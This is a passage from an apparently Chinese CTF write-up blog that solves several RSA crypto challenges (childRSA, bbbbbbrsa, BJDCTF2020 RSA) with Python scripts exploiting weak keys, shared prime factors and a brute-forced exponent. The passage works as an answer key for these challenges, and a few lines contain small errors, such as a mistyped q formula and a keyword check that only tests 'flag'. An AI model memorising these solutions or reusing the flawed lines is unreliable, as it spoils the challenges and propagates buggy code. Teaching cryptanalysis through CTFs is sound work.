class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> gmpy<span class="number">2</span></span><br><span class="line"><span class="attribute">import</span> libnum</span><br><span class="line"></span><br><span class="line"><span class="attribute">e</span> = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 获得n、c数据</span></span><br><span class="line"><span class="attribute">n_list</span> =<span class="meta"> []</span></span><br><span class="line"><span class="attribute">c_list</span> =<span class="meta"> []</span></span><br><span class="line"><span class="attribute">with</span> open(<span class="string">&quot;/Users/wenhui/Desktop/1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) as f:</span><br><span class="line">    <span class="attribute">for</span> each in f:</span><br><span class="line">        <span class="attribute">if</span> each.startswith(<span class="string">&quot;n =&quot;</span>):</span><br><span class="line">            <span class="attribute">n_list</span>.append(int(each[<span class="number">4</span>:].strip(&#x27;\n&#x27;)))</span><br><span class="line">        <span class="attribute">elif</span> each.startswith(<span class="string">&quot;c =&quot;</span>):</span><br><span class="line">            <span class="attribute">c_list</span>.append(int(each[<span class="number">4</span>:].strip(&#x27;\n&#x27;)))</span><br><span class="line"></span><br><span class="line"><span class="attribute">s</span> = <span class="number">0</span>  # 记录x位置</span><br><span class="line"><span class="attribute">for</span> x in n_list:</span><br><span class="line">    <span class="attribute">n</span> = s + <span class="number">1</span>  # 记录被比较项位置</span><br><span class="line">    <span class="attribute">while</span> n + <span class="number">1</span> &lt;= len(n_list):</span><br><span class="line">        <span class="attribute">if</span> gmpy<span class="number">2</span>.gcd(x, n_list[n]) != <span class="number">1</span>:</span><br><span class="line">            <span class="attribute">print</span>(<span class="string">&quot;n1:\n&quot;</span>, x, <span class="string">&quot;\n n2: \n&quot;</span>, n_list[n], <span class="string">&quot;\n p: \n&quot;</span>, gmpy<span class="number">2</span>.gcd(x, n_list[n]), <span class="string">&quot;\n\n\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># 一组，正常求解RSA</span></span><br><span class="line">            <span class="attribute">n1</span> = x</span><br><span class="line">            <span class="attribute">p</span> = gmpy<span class="number">2</span>.gcd(x, n_list[n])</span><br><span class="line">            <span class="attribute">q</span> = n<span class="number">1</span> // p</span><br><span class="line">            <span class="attribute">phi</span> = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">            <span class="attribute">c</span> = c_list[s]</span><br><span class="line">            <span class="attribute">d</span> = int(gmpy<span class="number">2</span>.invert(e, phi))</span><br><span class="line">            <span class="attribute">m</span> = gmpy<span class="number">2</span>.powmod(c, d, n<span class="number">1</span>)</span><br><span class="line">            <span class="attribute">print</span>(libnum.n<span class="number">2</span>s(int(m)))</span><br><span class="line">        <span class="attribute">n</span> += <span class="number">1</span></span><br><span class="line">    <span class="attribute">s</span> += <span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><blockquote><p> 不做题就没有记忆点</p></blockquote><p><strong>不互素</strong>在无思路时应该多试试。</p><h2 id="NCTF2019-childRSA"><a href="#NCTF2019-childRSA" class="headerlink" title="[NCTF2019]childRSA"></a>[NCTF2019]childRSA</h2><h3 id="题目-11"><a href="#题目-11" class="headerlink" title="题目"></a>题目</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> choice</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> isPrime, sieve_base <span class="keyword">as</span> primes</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getPrime</span>(<span class="params">bits</span>):</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        n = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> n.bit_length() &lt; bits:</span><br><span class="line">            n *= choice(primes)</span><br><span class="line">        <span class="keyword">if</span> isPrime(n + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">return</span> n + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">m = <span class="built_in">int</span>.from_bytes(flag.encode(), <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">p, q = [getPrime(<span class="number">2048</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>)]</span><br><span class="line">n = p * q</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="comment"># n = 32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span></span><br><span class="line"><span class="comment"># c = 26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span></span><br></pre></td></tr></table></figure><h3 id="题解-10"><a href="#题解-10" class="headerlink" title="题解"></a>题解</h3><p><strong>直接拆n得到p、q</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2, libnum</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">32849718197337581823002243717057659218502519004386996660885100592872201948834155543125924395614928962750579667346279456710633774501407292473006312537723894221717638059058796679686953564471994009285384798450493756900459225040360430847240975678450171551048783818642467506711424027848778367427338647282428667393241157151675410661015044633282064056800913282016363415202171926089293431012379261585078566301060173689328363696699811123592090204578098276704877408688525618732848817623879899628629300385790344366046641825507767709276622692835393219811283244303899850483748651722336996164724553364097066493953127153066970594638491950199605713033004684970381605908909693802373826516622872100822213645899846325022476318425889580091613323747640467299866189070780620292627043349618839126919699862580579994887507733838561768581933029077488033326056066378869170169389819542928899483936705521710423905128732013121538495096959944889076705471928490092476616709838980562233255542325528398956185421193665359897664110835645928646616337700617883946369110702443135980068553511927115723157704586595844927607636003501038871748639417378062348085980873502535098755568810971926925447913858894180171498580131088992227637341857123607600275137768132347158657063692388249513</span></span><br><span class="line">c = <span class="number">26308018356739853895382240109968894175166731283702927002165268998773708335216338997058314157717147131083296551313334042509806229853341488461087009955203854253313827608275460592785607739091992591431080342664081962030557042784864074533380701014585315663218783130162376176094773010478159362434331787279303302718098735574605469803801873109982473258207444342330633191849040553550708886593340770753064322410889048135425025715982196600650740987076486540674090923181664281515197679745907830107684777248532278645343716263686014941081417914622724906314960249945105011301731247324601620886782967217339340393853616450077105125391982689986178342417223392217085276465471102737594719932347242482670320801063191869471318313514407997326350065187904154229557706351355052446027159972546737213451422978211055778164578782156428466626894026103053360431281644645515155471301826844754338802352846095293421718249819728205538534652212984831283642472071669494851823123552827380737798609829706225744376667082534026874483482483127491533474306552210039386256062116345785870668331513725792053302188276682550672663353937781055621860101624242216671635824311412793495965628876036344731733142759495348248970313655381407241457118743532311394697763283681852908564387282605279108</span></span><br><span class="line">p = <span class="number">178449493212694205742332078583256205058672290603652616240227340638730811945224947826121772642204629335108873832781921390308501763661154638696935732709724016546955977529088135995838497476350749621442719690722226913635772410880516639651363626821442456779009699333452616953193799328647446968707045304702547915799734431818800374360377292309248361548868909066895474518333089446581763425755389837072166970684877011663234978631869703859541876049132713490090720408351108387971577438951727337962368478059295446047962510687695047494480605473377173021467764495541590394732685140829152761532035790187269724703444386838656193674253139</span></span><br><span class="line">q = <span class="number">184084121540115307597161367011014142898823526027674354555037785878481711602257307508985022577801782788769786800015984410443717799994642236194840684557538917849420967360121509675348296203886340264385224150964642958965438801864306187503790100281099130863977710204660546799128755418521327290719635075221585824217487386227004673527292281536221958961760681032293340099395863194031788435142296085219594866635192464353365034089592414809332183882423461536123972873871477755949082223830049594561329457349537703926325152949582123419049073013144325689632055433283354999265193117288252918515308767016885678802217366700376654365502867</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = <span class="built_in">int</span>(gmpy2.invert(e, phi))  <span class="comment"># d需要转换为整数型</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(libnum.n2s(m))</span><br></pre></td></tr></table></figure><h2 id="HDCTF2019-bbbbbbrsa"><a href="#HDCTF2019-bbbbbbrsa" class="headerlink" title="[HDCTF2019]bbbbbbrsa"></a>[HDCTF2019]bbbbbbrsa</h2><h3 id="题目-12"><a href="#题目-12" class="headerlink" title="题目"></a>题目</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># enc</span></span><br><span class="line"><span class="attribute">p</span> = <span class="number">177077389675257695042507998165006460849</span></span><br><span class="line"><span class="attribute">n</span> = <span class="number">37421829509887796274897162249367329400988647145613325367337968063341372726061</span></span><br><span class="line"><span class="attribute">c</span> = ==gMzYDNzIjMxUTNyIzNzIjMyYTM<span class="number">4</span>MDM<span class="number">0</span>gTMwEjNzgTM<span class="number">2</span>UTN<span class="number">4</span>cjNwIjN<span class="number">2</span>QzM<span class="number">5</span>ADMwIDNyMTO<span class="number">4</span>UzM<span class="number">2</span>cTM<span class="number">5</span>kDN<span class="number">2</span>MTOyUTO<span class="number">5</span>YDM<span class="number">0</span>czM<span class="number">3</span>MjM</span><br><span class="line"></span><br><span class="line"><span class="comment"># encode.py</span></span><br><span class="line"><span class="attribute">from</span> base<span class="number">64</span> import b<span class="number">64</span>encode as b<span class="number">32</span>encode</span><br><span class="line"><span class="attribute">from</span> gmpy<span class="number">2</span> import invert,gcd,iroot</span><br><span class="line"><span class="attribute">from</span> Crypto.Util.number import *</span><br><span class="line"><span class="attribute">from</span> binascii import a<span class="number">2</span>b_hex,b<span class="number">2</span>a_hex</span><br><span class="line"><span class="attribute">import</span> random</span><br><span class="line"></span><br><span class="line"><span class="attribute">flag</span> = <span class="string">&quot;******************************&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">nbit</span> = <span class="number">128</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">p</span> = getPrime(nbit)</span><br><span class="line"><span class="attribute">q</span> = getPrime(nbit)</span><br><span class="line"><span class="attribute">n</span> = p*q</span><br><span class="line"></span><br><span class="line"><span class="attribute">print</span> p</span><br><span class="line"><span class="attribute">print</span> n</span><br><span class="line"></span><br><span class="line"><span class="attribute">phi</span> = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">e</span> = random.randint(<span class="number">50000</span>,<span class="number">70000</span>)</span><br><span class="line"></span><br><span class="line"><span class="attribute">while</span> True:</span><br><span class="line"><span class="attribute">if</span> gcd(e,phi) == <span class="number">1</span>:</span><br><span class="line"><span class="attribute">break</span>;</span><br><span class="line"><span class="attribute">else</span>:</span><br><span class="line"><span class="attribute">e</span> -= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">c</span> = pow(int(b<span class="number">2</span>a_hex(flag),<span class="number">16</span>),e,n)</span><br><span class="line"></span><br><span class="line"><span class="attribute">print</span> b<span class="number">32</span>encode(str(c))[::-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2373740699529364991763589324200093466206785561836101840381622237225512234632</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="题解-11"><a href="#题解-11" class="headerlink" title="题解"></a>题解</h3><ul><li><p>q: 题目交代了p、n, 所以 q = n \ q </p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">p</span> = <span class="number">177077389675257695042507998165006460849</span></span><br><span class="line"><span class="attr">n</span> = <span class="number">37421829509887796274897162249367329400988647145613325367337968063341372726061</span></span><br><span class="line"><span class="attr">q</span> = n // p</span><br><span class="line"><span class="attr">phi</span> = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>c: 题目所示，先将flag转为16进制，再转10进制；最后在RSA加密后，<strong>base32编码</strong>再倒序打印</p><p>对此，只需要将c倒序在解码后RSA解密，即可</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> base<span class="number">64</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">c</span> = base<span class="number">64</span>.b<span class="number">32</span>decode(c[::-<span class="number">1</span>])</span><br></pre></td></tr></table></figure><p>但，这么写，执行起来会报错,<strong>binascii.Error: Non-base32 digit found</strong></p><p>很让人郁闷，以为写法有问题，改了多次，未果</p><p>最后上CyberChef👨‍🍳,看到用的是<strong>base64解码</strong>😅，<strong>所以是题目写错了吧🤔</strong></p><p>（现在看到了<strong>from base64 import b64encode as b32encode</strong>，啊这</p><p><img src="https://s2.loli.net/2022/01/13/SwvhZ7cDOLHtesE.png" alt="image-20220113151520874"></p></li><li><p>e: RSA解密中唯一的问题在于，不知道e</p><p>因为知道e的范围是五万到七万，手动爆破即可(使用每一个与phi互素的e，看最后解出来是不是乱码)</p><p>需要手动搜索关键词</p><figure class="highlight stan"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 爆破e</span></span><br><span class="line"><span class="built_in">e</span> = <span class="number">50000</span></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">e</span> &lt; <span class="number">70000</span>:</span><br><span class="line">    <span class="keyword">if</span> gcd(<span class="built_in">e</span>, phi) == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">e</span>)</span><br><span class="line">        d = <span class="keyword">int</span>(gmpy2.invert(<span class="built_in">e</span>, phi))</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        <span class="built_in">print</span>(libnum.n2s(m), <span class="string">&quot;\n\n&quot;</span>)</span><br><span class="line">        <span class="built_in">e</span> += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">e</span> += <span class="number">1</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="https://s2.loli.net/2022/01/13/lhSzUnIQe7TVigO.png" alt="image-20220113145655280"></p><p>😅恍然发现，题目最后一行注释里突兀的数字是十进制的c</p><p>最后，经过一点点完善</p><h4 id="代码-11"><a href="#代码-11" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2, base64, libnum</span><br><span class="line"></span><br><span class="line">p = <span class="number">177077389675257695042507998165006460849</span></span><br><span class="line">n = <span class="number">37421829509887796274897162249367329400988647145613325367337968063341372726061</span></span><br><span class="line">q = n // p</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取c</span></span><br><span class="line"><span class="comment"># 对 c倒序 再 base64解码</span></span><br><span class="line">c = <span class="string">&quot;==gMzYDNzIjMxUTNyIzNzIjMyYTM4MDM0gTMwEjNzgTM2UTN4cjNwIjN2QzM5ADMwIDNyMTO4UzM2cTM5kDN2MTOyUTO5YDM0czM3MjM&quot;</span></span><br><span class="line">c = <span class="built_in">int</span>(base64.b64decode(c[::-<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 爆破e，进行RSA解，手动筛选关键词</span></span><br><span class="line">e = <span class="number">50000</span></span><br><span class="line"><span class="keyword">while</span> e &lt; <span class="number">70000</span>:</span><br><span class="line">    <span class="keyword">if</span> gcd(e, phi) == <span class="number">1</span>:</span><br><span class="line">        d = <span class="built_in">int</span>(gmpy2.invert(e, phi))</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        flag = libnum.n2s(m)</span><br><span class="line">        <span class="keyword">if</span> (<span class="string">&quot;flag&quot;</span> <span class="keyword">or</span> <span class="string">&quot;ctf&quot;</span>) <span class="keyword">in</span> <span class="built_in">str</span>(flag).lower():</span><br><span class="line">            <span class="built_in">print</span>(flag.decode())</span><br><span class="line">        e += <span class="number">1</span></span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        e += <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="BJDCTF2020-RSA"><a href="#BJDCTF2020-RSA" class="headerlink" title="[BJDCTF2020]RSA"></a>[BJDCTF2020]RSA</h2><h3 id="题目-13"><a href="#题目-13" class="headerlink" title="题目"></a>题目</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import getPrime,bytes_to_long</span><br><span class="line"></span><br><span class="line">flag=open(<span class="string">&quot;flag&quot;</span>,<span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">q=getPrime(<span class="number">1024</span>)</span><br><span class="line">assert(e&lt;<span class="number">100000</span>)</span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(flag)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">print c,n</span><br><span class="line">print <span class="built_in">pow</span>(<span class="number">294</span>,e,n)</span><br><span class="line"></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">n=p*q</span><br><span class="line">m=bytes_to_long(<span class="string">&quot;BJD&quot;</span>*<span class="number">32</span>)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line">print c,n</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">output:</span><br><span class="line"><span class="number">12641635617803</span><span class="number">74615033223264</span><span class="number">63545962927078</span><span class="number">61480200207537</span><span class="number">19914118362443</span><span class="number">83037571205700</span><span class="number">96741248020236</span><span class="number">66696575579800</span><span class="number">96565477386163</span><span class="number">99025300123043</span><span class="number">76625551859614</span><span class="number">93489304445998</span><span class="number">20675230046423</span><span class="number">37305305163193</span><span class="number">25572308490834</span><span class="number">26859490183732</span><span class="number">30375174400487</span><span class="number">41830625948568</span><span class="number">70318614289991</span><span class="number">67598006354831</span><span class="number">64994869089232</span><span class="number">09627563871554</span><span class="number">87561270207910</span><span class="number">05670186989929</span><span class="number">35818206109087</span><span class="number">56816609739231</span><span class="number">41057175554829</span><span class="number">26141030505639</span><span class="number">57170887621316</span><span class="number">71121879625844</span><span class="number">84065321545727</span><span class="number">59413517536923</span><span class="number">39259225077949</span><span class="number">99607323536976</span><span class="number">82418316292338</span><span class="number">50056699304034</span><span class="number">48853465141405</span><span class="number">84683591984290</span><span class="number">84697875473417</span><span class="number">52365471892495</span><span class="number">20430764458616</span><span class="number">13932287760420</span><span class="number">15534147913888</span><span class="number">33831624416912</span>0  <span class="number">13508774104460</span><span class="number">20974330671403</span><span class="number">45467041372476</span><span class="number">27344981133461</span><span class="number">80195347973601</span><span class="number">70214017258188</span><span class="number">08462898375994</span><span class="number">76737562774949</span><span class="number">48396719445438</span><span class="number">22403059978073</span><span class="number">81312244140761</span><span class="number">25306581689429</span><span class="number">87820256786583</span><span class="number">00694700171174</span><span class="number">92301935423705</span><span class="number">70950705530167</span><span class="number">92170283562712</span><span class="number">24014752510390</span><span class="number">00775017381633</span><span class="number">90022247472739</span><span class="number">68237086950631</span><span class="number">36246115652622</span><span class="number">25976963459130</span><span class="number">94217612695482</span><span class="number">60984426148824</span><span class="number">64128501073098</span><span class="number">32153775092550</span><span class="number">11298737827621</span><span class="number">61115803297642</span><span class="number">00116625478545</span><span class="number">15610597955628</span><span class="number">89807356968415</span><span class="number">82256783334745</span><span class="number">43920326532893</span><span class="number">44684980811283</span><span class="number">74766843900309</span><span class="number">76472053905069</span><span class="number">85552229785068</span><span class="number">80269607011865</span><span class="number">43428139843783</span><span class="number">90762431727479</span><span class="number">69262488295434</span><span class="number">13464754127208</span><span class="number">84307033106303</span>7</span><br><span class="line"><span class="number">38163126882580</span><span class="number">64695181663703</span><span class="number">87352035475775</span><span class="number">67716361573075</span><span class="number">94543439135636</span><span class="number">15970881967332</span><span class="number">40770990123563</span><span class="number">77189361841989</span><span class="number">30226303761876</span><span class="number">51710120867710</span><span class="number">73110060657280</span><span class="number">14220477966000</span><span class="number">62096405661605</span><span class="number">86769998789769</span><span class="number">43319063836649</span><span class="number">08508537757727</span><span class="number">32147923715487</span><span class="number">75204594097887</span><span class="number">07889859846389</span><span class="number">24401415779745</span><span class="number">44939268247818</span><span class="number">93793660701310</span><span class="number">08081697586750</span><span class="number">42264568547764</span><span class="number">03162843141472</span><span class="number">79221685809984</span><span class="number">94695800403043</span><span class="number">31240664352763</span><span class="number">76674663184736</span><span class="number">69542326169218</span><span class="number">66536642304357</span><span class="number">90033884866341</span><span class="number">67642663495896</span><span class="number">60728215580833</span><span class="number">19023511885001</span><span class="number">97960905672207</span><span class="number">04657964705276</span><span class="number">45794118143056</span><span class="number">89137519860880</span><span class="number">91646727205677</span><span class="number">86414427589401</span><span class="number">35016400808740</span><span class="number">38714450815635</span><span class="number">806795521501</span>8</span><br><span class="line"><span class="number">97915337055253</span><span class="number">51534984774597</span><span class="number">20877329811204</span><span class="number">68820838754382</span><span class="number">61225821324042</span><span class="number">14848454954722</span><span class="number">48708665806140</span><span class="number">87952238050222</span><span class="number">02997613522014</span><span class="number">73698345212107</span><span class="number">38600548513023</span><span class="number">43517756732701</span><span class="number">02666706276590</span><span class="number">62776268792154</span><span class="number">57936330799698</span><span class="number">81275597305755</span><span class="number">76209301727788</span><span class="number">59116538571207</span><span class="number">10042499083850</span><span class="number">82551276166373</span><span class="number">34499680058645</span><span class="number">41178692530236</span><span class="number">87904147682486</span><span class="number">11809358160197</span><span class="number">55436925545867</span><span class="number">54501094579876</span><span class="number">98749584630551</span><span class="number">17757749204340</span><span class="number">36564199682851</span><span class="number">63536823819817</span><span class="number">57353135649723</span><span class="number">61543426899145</span><span class="number">25321673807925</span><span class="number">45865185476851</span><span class="number">23963553897408</span><span class="number">63270148775362</span><span class="number">74444811558163</span><span class="number">96293263623421</span><span class="number">60548500035000</span><span class="number">15609721544688</span><span class="number">12510555054657</span><span class="number">13854173913142</span><span class="number">04097638250043</span><span class="number">518544252172</span>1  <span class="number">12806210903061</span><span class="number">36836905430957</span><span class="number">51593603740223</span><span class="number">44774547459345</span><span class="number">21690712819395</span><span class="number">75929380718158</span><span class="number">65954073287532</span><span class="number">54594737067183</span><span class="number">83721448065397</span><span class="number">53829484356064</span><span class="number">91935728562330</span><span class="number">52096006805709</span><span class="number">75224639214396</span><span class="number">80512435086277</span><span class="number">21592723627787</span><span class="number">68036844634760</span><span class="number">91761270872178</span><span class="number">73201593184324</span><span class="number">56050806227784</span><span class="number">43509116111998</span><span class="number">26139873032559</span><span class="number">95543165395426</span><span class="number">65805946211005</span><span class="number">64313925175487</span><span class="number">17447898084915</span><span class="number">16766117236298</span><span class="number">42512016886394</span><span class="number">69652283452307</span><span class="number">71282139885701</span><span class="number">64875907949965</span><span class="number">44468826705600</span><span class="number">33220853520144</span><span class="number">33222672987471</span><span class="number">17528882985955</span><span class="number">37524642481261</span><span class="number">64783271823994</span><span class="number">61709978893464</span><span class="number">09324513553013</span><span class="number">54300078422233</span><span class="number">89360212803439</span><span class="number">85086761512114</span><span class="number">80500348877675</span><span class="number">84693608776323</span><span class="number">25223325426104</span>7</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure><h3 id="题解-12"><a href="#题解-12" class="headerlink" title="题解"></a>题解</h3><p>常规题目</p><ul><li><p><strong>n1、n2不互素</strong></p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">n1</span> = <span class="number">13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037</span></span><br><span class="line"><span class="attr">n2</span> = <span class="number">12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047</span></span><br><span class="line"><span class="attr">q</span> = gcd(n1, n2)</span><br><span class="line"><span class="attr">p1</span> = n1 // q</span><br><span class="line"><span class="attr">p2</span> = n2 // 